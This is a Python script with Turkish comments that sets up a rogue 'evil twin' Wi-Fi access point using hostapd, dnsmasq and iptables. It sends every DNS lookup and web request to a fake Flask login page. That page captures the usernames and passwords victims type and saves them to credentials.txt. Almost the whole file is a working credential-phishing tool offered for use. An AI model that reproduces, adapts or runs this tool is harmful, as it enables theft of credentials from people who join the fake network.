#!/usr/bin/env python3

import subprocess
import os
import time
import threading
from flask import Flask, request, render_template_string
import logging

# Flask uygulamasını başlat
app = Flask(__name__)

# Kimlik bilgilerini saklamak için dosya
LOG_FILE = "credentials.txt"

def print_header():
    print(r"""
  ____                  _               _             
 / ___|  ___  _ __ ___ (_) ___  _ __   (_) ___  _ __  
 \___ \ / _ \| '_ ` _ \| |/ _ \| '_ \  | |/ _ \| '_ \ 
  ___) | (_) | | | | | | | (_) | | | | | | (_) | | | |
 |____/ \___/|_| |_| |_|_|\___/|_| |_|_|_|\___/|_| |_|""")
    print("\n****************************************************************")
    
    print("\n****************************************************************")

def check_sudo_privileges():
    """Süper kullanıcı yetkileriyle çalışılıp çalışılmadığını kontrol et."""
    if os.geteuid() != 0:
        print("Bu programı sudo ile çalıştırmalısınız.")
        exit(1)

def setup_access_point(interface, ssid, channel):
    """Sahte Wi-Fi erişim noktası oluştur."""
    print(f"{ssid} adında sahte erişim noktası oluşturuluyor (Kanal: {channel})...")

    # hostapd yapılandırma dosyasını oluştur
    hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    # dnsmasq yapılandırma dosyasını oluştur (DHCP ve DNS için)
    dnsmasq_conf = f"""
interface={interface}
dhcp-range=192.168.1.2,192.168.1.100,12h
address=/#192.168.1.1
"""
    with open("dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)

    # Arayüzü yapılandır
    subprocess.run(["ip", "link", "set", interface, "down"])
    subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", interface])
    subprocess.run(["ip", "link", "set", interface, "up"])

    # IP yönlendirmesini etkinleştir
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"])
    subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", interface, "-j", "MASQUERADE"])

    # dnsmasq ve hostapd başlat
    subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["hostapd", "hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def cleanup():
    """Temizlik işlemleri yap."""
    print("\nTemizlik yapılıyor...")
    subprocess.run(["pkill", "hostapd"])
    subprocess.run(["pkill", "dnsmasq"])
    subprocess.run(["iptables", "-F"])
    subprocess.run(["iptables", "-t", "nat", "-F"])
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])

# Sahte giriş sayfası HTML şablonu
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Wi-Fi Giriş</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 50px; }
        .container { background-color: #fff; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        input { padding: 10px; margin: 10px; width: 200px; border: 1px solid #ccc; border-radius: 5px; }
        button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Wi-Fi Ağına Bağlan</h2>
        <form method="POST" action="/">
            <input type="text" name="username" placeholder="Kullanıcı Adı" required><br>
            <input type="password" name="password" placeholder="Şifre" required><br>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login_page():
    """Sahte giriş sayfasını sun ve kimlik bilgilerini kaydet."""
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print(f"[+] Yeni kimlik bilgisi alındı: Kullanıcı Adı: {username}, Şifre: {password}")
        with open(LOG_FILE, "a") as f:
            f.write(f"Zaman: {datetime.now()}, Kullanıcı Adı: {username}, Şifre: {password}\n")
        return "Giriş başarılı! İnternete bağlanıyorsunuz..."
    return render_template_string(LOGIN_PAGE)

def run_flask():
    """Flask web sunucusunu başlat."""
    app.run(host="0.0.0.0", port=80, debug=False, use_reloader=False)

def main():
    print_header()
    check_sudo_privileges()

    # Kullanıcıdan bilgileri al
    interface = input("Lütfen Wi-Fi arayüzünü girin (örneğin wlan0): ").strip()
    ssid = input("Sahte Wi-Fi ağ adı (SSID) girin (örneğin FreeWiFi): ").strip() or "FreeWiFi"
    channel = input("Kanal numarasını girin (varsayılan 6, boş bırakabilirsiniz): ").strip() or "6"

    # Sahte erişim noktası oluştur
    setup_access_point(interface, ssid, channel)
    print(f"\nSahte Wi-Fi ağı ({ssid}) oluşturuldu. Kullanıcıların bağlanmasını bekleyin.")
    print(f"Sahte giriş sayfası: http://192.168.1.1")

    # Flask sunucusunu ayrı bir thread’de başlat
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()
